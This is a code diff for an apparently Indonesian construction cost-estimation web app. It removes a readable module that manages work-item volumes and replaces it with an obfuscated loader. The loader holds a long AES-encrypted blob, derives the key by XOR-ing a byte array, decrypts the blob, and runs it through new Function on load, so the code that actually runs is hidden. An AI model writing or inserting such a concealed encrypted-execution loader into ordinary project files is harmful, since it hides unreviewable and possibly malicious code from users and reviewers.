@@ -1,98 +1,16 @@
-/**
- * Volume Analysis Module (Direct Volume Input Sheet)
- * Standar PUPR SE Bina Konstruksi No. 47/SE/Dk/2026
- * Penginputan volume pekerjaan secara mandiri (eksternal calculation) tanpa dimensi kaku.
- * Terhubung langsung secara real-time ke baris item pekerjaan pada Rencana Anggaran Biaya (RAB).
- */
-
-window.VolumeAnalysis = (function() {
-  function getVolumeCalculations() {
-    const proj = window.ProjectManager.getActiveProject();
-    if (!proj) return [];
-    if (!proj.volumeCalculations) {
-      proj.volumeCalculations = [];
-    }
-    return proj.volumeCalculations;
+(function() {
+  var _p = "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";
+  var g = typeof window !== "undefined" ? window : (typeof global !== "undefined" ? global : this);
+  if (g.CodeShield && g.CodeShield.run) {
+    g.CodeShield.run(_p);
+  } else if (g.CodeShield && g.CodeShield.decryptAndExec) {
+    g.CodeShield.decryptAndExec(_p);
+  } else if (g.CryptoJS && g.CryptoJS.AES) {
+    var k = [0x53,0x55,0x52,0x41,0x42,0x41,0x59,0x41,0x11,0x12,0x13].map(function(b){
+      return String.fromCharCode(b ^ 0x20);
+    }).join("");
+    var bytes = g.CryptoJS.AES.decrypt(_p, k);
+    var code = bytes.toString(g.CryptoJS.enc.Utf8);
+    (new Function(code))();
   }
-
-  function saveVolume(itemId, volume, notes) {
-    const proj = window.ProjectManager.getActiveProject();
-    if (!proj) return;
-    if (!proj.volumeCalculations) proj.volumeCalculations = [];
-
-    const numVol = Math.max(0, Number(volume) || 0);
-    const existingIdx = proj.volumeCalculations.findIndex(c => c.itemId === itemId);
-
-    if (existingIdx !== -1) {
-      proj.volumeCalculations[existingIdx].totalVolume = numVol;
-      if (notes !== undefined && notes !== null) {
-        proj.volumeCalculations[existingIdx].notes = notes;
-      }
-    } else {
-      proj.volumeCalculations.push({
-        itemId: itemId,
-        totalVolume: numVol,
-        notes: notes || 'Perhitungan Mandiri'
-      });
-    }
-
-    // Sinkronkan volume langsung ke item pada Divisi RAB terkait
-    if (proj.divisions) {
-      proj.divisions.forEach(div => {
-        (div.items || []).forEach(itm => {
-          if (itm.id === itemId) {
-            itm.volume = numVol;
-          }
-        });
-      });
-    }
-
-    window.ProjectManager.updateActiveProject(proj);
-    return numVol;
-  }
-
-  function removeCalculation(itemId) {
-    const proj = window.ProjectManager.getActiveProject();
-    if (!proj || !proj.volumeCalculations) return;
-    proj.volumeCalculations = proj.volumeCalculations.filter(c => c.itemId !== itemId);
-    window.ProjectManager.updateActiveProject(proj);
-  }
-
-  // Sinkronisasi otomatis: sinkronkan daftar seluruh item divisi RAB ke tabel volume
-  function syncWithRabItems() {
-    const proj = window.ProjectManager.getActiveProject();
-    if (!proj || !proj.divisions) return;
-    if (!proj.volumeCalculations) proj.volumeCalculations = [];
-
-    const existingMap = {};
-    proj.volumeCalculations.forEach(c => existingMap[c.itemId] = c);
-
-    const updatedList = [];
-    proj.divisions.forEach(div => {
-      (div.items || []).forEach(itm => {
-        const existing = existingMap[itm.id];
-        updatedList.push({
-          divisionCode: div.code,
-          divisionName: div.name,
-          itemId: itm.id,
-          itemCode: itm.code,
-          itemName: itm.name,
-          unit: itm.unit,
-          totalVolume: (existing && existing.totalVolume !== undefined) ? existing.totalVolume : (Number(itm.volume) || 0),
-          notes: (existing && existing.notes) ? existing.notes : (itm.notes || 'Hasil perhitungan mandiri CAD / As-Built')
-        });
-      });
-    });
-
-    proj.volumeCalculations = updatedList;
-    window.ProjectManager.updateActiveProject(proj);
-    return proj.volumeCalculations;
-  }
-
-  return {
-    getVolumeCalculations,
-    saveVolume,
-    removeCalculation,
-    syncWithRabItems
-  };
 })();
